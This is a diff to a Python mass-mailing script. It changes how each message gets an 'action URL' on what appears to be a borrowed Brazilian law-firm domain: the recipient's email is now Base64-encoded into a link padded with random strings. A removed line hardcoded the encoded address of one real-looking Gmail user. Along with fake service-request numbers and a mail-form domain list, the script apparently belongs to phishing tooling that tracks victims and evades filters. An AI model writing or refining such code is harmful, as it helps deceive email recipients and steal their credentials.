@@ -6,6 +6,7 @@ retry files have the correct permissions.
 from datetime import datetime
 import random
 import string
+import base64
 
 # File settings
 LOG_FILENAME = "C:\\Users\\HP\\PycharmProjects\\python-mailer\\pymailer.log"
@@ -41,12 +42,22 @@ def generate_random_string(length):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 
-def generate_action_url(base_url):
+def encode_email_base64(email):
     """
-    Replace placeholders like Rand(x) in the URL with random strings.
-    :param base_url: Base URL containing placeholders (e.g., Rand(8)).
-    :return: Updated URL with random strings.
+    Encode an email address to Base64.
+    :param email: Email address.
+    :return: Base64 encoded email.
     """
+    return base64.b64encode(email.encode('utf-8')).decode('utf-8')
+
+
+def generate_action_url(base_url, email):
+    """
+    Replace placeholders like Rand(x) in the URL with random strings and include Base64 email.
+    """
+    base64_email = encode_email_base64(email)
+    base_url = base_url.replace("{base64email}", base64_email)
+
     while "Rand(" in base_url:
         start = base_url.find("Rand(")
         end = base_url.find(")", start)
@@ -67,11 +78,18 @@ def generate_service_request_number():
 
 
 # html variables
+# date_long = datetime.now().strftime("%B %d, %Y")
+# service_request_number = generate_service_request_number()
+# # action_url_template = "https://Rand(8).lellisadvocacia.com.br/Rand(6)Z2VvcmdlcXVpbjE5QGdtYWlsLmNvbQ==Rand(6)"
+# action_url_template = "https://Rand(8).lellisadvocacia.com.br/Rand(6){base64email}Rand(6)"
+# action_url = generate_action_url(action_url_template)
+# print("Generated Action URL:", action_url)
+
+
 date_long = datetime.now().strftime("%B %d, %Y")
 service_request_number = generate_service_request_number()
-action_url_template = "https://Rand(8).lellisadvocacia.com.br/Rand(6)Z2VvcmdlcXVpbjE5QGdtYWlsLmNvbQ==Rand(6)"
-action_url = generate_action_url(action_url_template)
-print("Generated Action URL:", action_url)
+action_url_template = "https://Rand(8).lellisadvocacia.com.br/Rand(6){base64email}Rand(6)"
+
 
 # Mail-form domains (optional, for reference)
 MAILFORM_DOMAINS = [
